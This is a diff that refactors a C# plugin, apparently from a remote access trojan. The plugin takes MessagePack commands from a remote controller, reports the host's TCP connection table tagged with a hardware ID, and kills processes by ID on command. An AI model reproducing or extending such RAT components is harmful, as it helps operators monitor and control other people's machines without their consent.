@@ -1,16 +1,8 @@
-﻿using MessagePackLib.MessagePack;
-using Plugin.Handler;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Diagnostics;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.IO;
-using System.Linq;
-using System.Management;
-using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
+using MessagePackLib.MessagePack;
+using Plugin.Handler;
 
 namespace Plugin
 {
@@ -18,33 +10,33 @@ namespace Plugin
     {
         public static void Read(object data)
         {
-            MsgPack unpack_msgpack = new MsgPack();
+            var unpack_msgpack = new MsgPack();
             unpack_msgpack.DecodeFromBytes((byte[])data);
             switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
             {
                 case "Netstat":
+                {
+                    switch (unpack_msgpack.ForcePathObject("Option").AsString)
                     {
-                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
+                        case "List":
                         {
-                            case "List":
-                                {
-                                    new HandleNetstat().NetstatList();
-                                    break;
-                                }
+                            new HandleNetstat().NetstatList();
+                            break;
+                        }
 
-                            case "Kill":
-                                {
-                                    new HandleNetstat().Kill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
-                                    break;
-                                }
+                        case "Kill":
+                        {
+                            new HandleNetstat().Kill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
+                            break;
                         }
                     }
+                }
                     break;
             }
         }
     }
 
-    
+
     public class HandleNetstat
     {
         public void Kill(int ID)
@@ -53,13 +45,15 @@ namespace Plugin
             {
                 try
                 {
-                    if (process.Id == ID)
-                    {
-                        process.Kill();
-                    }
+                    if (process.Id == ID) process.Kill();
                 }
-                catch { };
+                catch
+                {
+                }
+
+                ;
             }
+
             NetstatList();
         }
 
@@ -67,29 +61,32 @@ namespace Plugin
         {
             try
             {
-                StringBuilder sb = new StringBuilder();
-                TcpConnectionTableHelper.MIB_TCPROW_OWNER_PID[] tcpProgressInfoTable = TcpConnectionTableHelper.GetAllTcpConnections();
+                var sb = new StringBuilder();
+                var tcpProgressInfoTable = TcpConnectionTableHelper.GetAllTcpConnections();
 
 
-
-                int tableRowCount = tcpProgressInfoTable.Length;
-                for (int i = 0; i < tableRowCount; i++)
+                var tableRowCount = tcpProgressInfoTable.Length;
+                for (var i = 0; i < tableRowCount; i++)
                 {
-                    TcpConnectionTableHelper.MIB_TCPROW_OWNER_PID row = tcpProgressInfoTable[i];
-                    string source = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.localAddr), row.LocalPort);
-                    string dest = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.remoteAddr), row.RemotePort);
-                    sb.Append(row.owningPid + "-=>" + source + "-=>" + dest + "-=>" + (TCP_CONNECTION_STATE)row.state + "-=>");
+                    var row = tcpProgressInfoTable[i];
+                    var source = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.localAddr),
+                        row.LocalPort);
+                    var dest = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.remoteAddr),
+                        row.RemotePort);
+                    sb.Append(row.owningPid + "-=>" + source + "-=>" + dest + "-=>" + (TCP_CONNECTION_STATE)row.state +
+                              "-=>");
                 }
+
                 Debug.WriteLine(sb);
-                MsgPack msgpack = new MsgPack();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "netstat";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("Message").AsString = sb.ToString();
                 Connection.Send(msgpack.Encode2Bytes());
             }
-            catch { }
+            catch
+            {
+            }
         }
-
     }
-
 }
